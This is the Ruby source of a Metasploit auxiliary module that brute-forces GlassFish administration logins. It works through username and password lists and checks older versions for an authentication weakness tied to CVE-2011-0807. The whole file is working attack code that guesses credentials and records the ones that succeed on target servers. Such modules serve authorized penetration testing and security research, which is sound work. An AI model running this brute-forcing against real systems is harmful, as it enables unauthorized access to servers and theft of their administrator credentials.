##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/glassfish'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'GlassFish Brute Force Utility',
      'Description'    => %q{
        This module attempts to login to GlassFish instance using username and password
        combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
        It will also try to do an authentication bypass against older versions of GlassFish.
        Note: by default, GlassFish 4.0 requires HTTPS, which means you must set the SSL option
        to true, and SSLVersion to TLS1. It also needs Secure Admin to access the DAS remotely.
      },
      'Author'         =>
        [
          'Joshua Abraham <jabra[at]spl0it.org>', # @Jabra
          'sinn3r'
        ],
      'References'     =>
        [
          ['CVE', '2011-0807'],
          ['OSVDB', '71948']
        ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        # There is no TARGETURI because when Glassfish is installed, the path is /
        Opt::RPORT(4848),
        OptString.new('USERNAME',[true, 'A specific username to authenticate as','admin']),
      ])
  end

  #
  # Module tracks the session id, and then it will have to pass the last known session id to
  # the LoginScanner class so the authentication can proceed properly
  #

  #
  # For a while, older versions of Glassfish didn't need to set a password for admin,
  # but looks like no longer the case anymore, which means this method is getting useless
  # (last tested: Aug 2014)
  #
  def is_password_required?(version)
    success = false

    if version =~ /^[29]\.x$/
      res = send_request_cgi({'uri'=>'/applications/upload.jsf'})
      p = /<title>Deploy Enterprise Applications\/Modules/
      if (res && res.code.to_i == 200 && res.body.match(p) != nil)
        success = true
      end
    elsif version =~ /^3\./
      res = send_request_cgi({'uri'=>'/common/applications/uploadFrame.jsf'})
      p = /<title>Deploy Applications or Modules/
      if (res && res.code.to_i == 200 && res.body.match(p) != nil)
        success = true
      end
    end

    success
  end


  def init_loginscanner(ip)
    @cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file:       datastore['PASS_FILE'],
      password:        datastore['PASSWORD'],
      user_file:       datastore['USER_FILE'],
      userpass_file:   datastore['USERPASS_FILE'],
      username:        datastore['USERNAME'],
      user_as_pass:    datastore['USER_AS_PASS']
    )

    @scanner = Metasploit::Framework::LoginScanner::Glassfish.new(
      configure_http_login_scanner(
        cred_details:       @cred_collection,
        stop_on_success:    datastore['STOP_ON_SUCCESS'],
        bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username:      datastore['HttpUsername'],
        http_password:      datastore['HttpPassword']
      )
    )
  end

  def do_report(ip, port, result)
    service_data = {
      address: ip,
      port: port,
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: :password,
      username: result.credential.public,
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: result.status
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def bruteforce(ip)
    @scanner.scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
        do_report(ip, rport, result)
      when Metasploit::Model::Login::Status::DENIED_ACCESS
        print_brute :level => :status, :ip => ip, :msg => "Correct credentials, but unable to login: '#{result.credential}'"
        do_report(ip, rport, result)
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        if datastore['VERBOSE']
          print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
        end
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
        )
      when Metasploit::Model::Login::Status::INCORRECT
        if datastore['VERBOSE']
          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
        end
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
        )
      end
    end
  end



  #
  # main
  #
  def run_host(ip)
    init_loginscanner(ip)
    msg = @scanner.check_setup
    if msg
      print_brute :level => :error, :ip => rhost, :msg => msg
      return
    end

    print_brute :level=>:status, :ip=>rhost, :msg=>('Checking if Glassfish requires a password...')
    if @scanner.version =~ /^[239]\.x$/ && is_password_required?(@scanner.version)
      print_brute :level => :good, :ip => ip, :msg => "Note: This Glassfish does not require a password"
    else
      print_brute :level=>:status, :ip=>rhost, :msg=>("Glassfish is protected with a password")
    end

    bruteforce(ip) unless @scanner.version.blank?
  end
end
